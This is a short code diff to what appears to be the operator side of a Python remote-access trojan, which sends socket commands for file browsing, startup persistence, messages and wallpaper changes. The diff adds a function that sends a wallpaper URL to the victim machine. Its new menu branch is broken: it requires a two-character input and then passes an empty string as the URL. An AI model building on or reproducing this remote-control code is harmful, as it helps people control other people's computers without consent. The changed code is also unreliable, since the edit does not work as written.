@@ -266,6 +266,11 @@ def browse_files():
 
     print(f"\n{strClientResponse}")
 
+def setWallpaper(url):
+    send(("wallpaper" + url).encode())
+    intBuffer = int(recv(intBuff).decode())  # receive buffer size
+    print(recv(intBuffer))
+
 
 def startup():
     send(b"startup")
@@ -457,9 +462,8 @@ def send_commands():
             elif strChoice[:1] == "m" and len(strChoice) > 1:
                 strMsg = "msg" + strChoice[2:]
                 send(strMsg.encode())
-            elif strChoice == "w":
-                strMsg = "wallpaper"
-                send(strMsg.encode())
+            elif strChoice[:1] == "w" and len(strChoice) == 2:
+                setWallpaper(strChoice[2:])
             elif strChoice == "a 1":
                 startup()
             elif strChoice == "a 2":
